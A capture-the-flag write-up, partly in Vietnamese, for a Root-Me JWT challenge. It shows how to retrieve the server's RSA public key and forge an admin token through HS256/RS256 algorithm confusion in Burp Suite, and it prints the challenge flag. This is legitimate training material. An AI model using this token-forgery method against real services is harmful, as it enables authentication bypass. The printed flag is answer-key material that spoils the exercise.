# [JSON Web Token (JWT) - Public key](https://www.root-me.org/en/Challenges/Web-Server/JSON-Web-Token-JWT-Public-key)

## Solutions

- /key (accessible with GET): lấy được public key

```bash
┌──(kali㉿kali)-[~/Documents]
└─$ echo "-----BEGIN PUBLIC KEY-----", "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAm4e+xAiA84JaSd/p4Jhl", "Pe06MmZ7M2jKgM2IZSaFNgPJjqJxhgiJXAlzOP93zVbaKyC/eG0Px2Mq12oCkiAF", "3nVkWkHyRcfuH9VlpNR2qv22fHCElsXMt9M5oQyRgVcnJGM1SisA40SDQRm8LGF3", "w13/nvcIgrJQUstUgTo8WXCOEBThaOTVLtUtMrx4ZH1vcF56fhIz/cCesMy58otn", "XXV5bmsSpy/epYT8ffVeInNWYoaGI/+WgttXnPXXk9dhbeOrvVlYnKaOSem5vHTf", "5irPCzSzvT4WcIbCMPcUshkK3l4nWH49RnSPVVg80yDLMaGFk0pzc3yYkpYncR0X", "aQIDAQAB", "-----END PUBLIC KEY-----" | sed 's/, /\n/g' > mykey.pem 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents]
└─$ cat mykey.pem              
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAm4e+xAiA84JaSd/p4Jhl
Pe06MmZ7M2jKgM2IZSaFNgPJjqJxhgiJXAlzOP93zVbaKyC/eG0Px2Mq12oCkiAF
3nVkWkHyRcfuH9VlpNR2qv22fHCElsXMt9M5oQyRgVcnJGM1SisA40SDQRm8LGF3
w13/nvcIgrJQUstUgTo8WXCOEBThaOTVLtUtMrx4ZH1vcF56fhIz/cCesMy58otn
XXV5bmsSpy/epYT8ffVeInNWYoaGI/+WgttXnPXXk9dhbeOrvVlYnKaOSem5vHTf
5irPCzSzvT4WcIbCMPcUshkK3l4nWH49RnSPVVg80yDLMaGFk0pzc3yYkpYncR0X
aQIDAQAB
-----END PUBLIC KEY-----
```

- /auth (accessible with POST): lấy được một jwt mẫu

```bash
┌──(kali㉿kali)-[~/Documents]
└─$ echo eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWkifQ.AyteUIJafWahnmm9eCkyBwGfU1JiIv6bHtC_N16JYNLBAuPCJG0a0iZQ5N7h8dMS-zAU7uzvmWOmEEhtG-O5GubnQKqGUc_EvEVVvmxo8DL_d-ZkpKg8JtPX7CzNcwsYP_s05ykh8GJ-bDy26JZMpp7-CVoQbzLsgm6AiNfzYfQ3ScKKds12WJyldsXw5VLuwYxBpQmoPmUvebgdsQ2_1M5XBNU_pYhfVE3SqHhrv3CAeO0_VMefyz17QXeNS20apyhhuVHtl0LDtzdEMjoNI4ReB2SbieIy9M3Sl80-Hp6PG88fgFx4sSEvq3Xnb5h6k3H-4fAqivYcjuVUyX9rXA | base64 -d -i
{"alg":"RS256","typ":"JWT"}{"username":"admi"}2�%��j��� p�5&"/���z%�K
                                                                     ��kH�C�{��LK0����c�Hm▒�F���*��pK�U[�Ə-�d��<&���,�s
                                                                                                                       ▒>�9�H|▒���n�d�i�%hA�˲   �#_��'
)�5�br��ÕK�1�&������v�6��W�)b�t�▒�� ;ELy��״xԶѪr��t,;stC#��8E�vI��#/L�)|�zz<o<~q�Ą��ם�a�M���*����T�k\base64: invalid input

```

- Sử dụng burp suite với extender `JWT Editor`:
  - add rsa public key lấy được ở trên vào tab `JWT Editor Keys`:

<img src="./image/add_rsa_public_key.png">

- sử dụng nút attack - hmac key confusion với header `"alg": "HS256"` và payload `"username": "admin"`:

<img src="./image/attack-hmac-key-confusing.png">

- gửi jwt mới được tạo đến trang /admin:

  ```json
  {"result": "Congrats !! Here is your flag : HardcodeYourAlgoBro\n"}
  ```

## References

- <https://portswigger.net/web-security/jwt/algorithm-confusion>
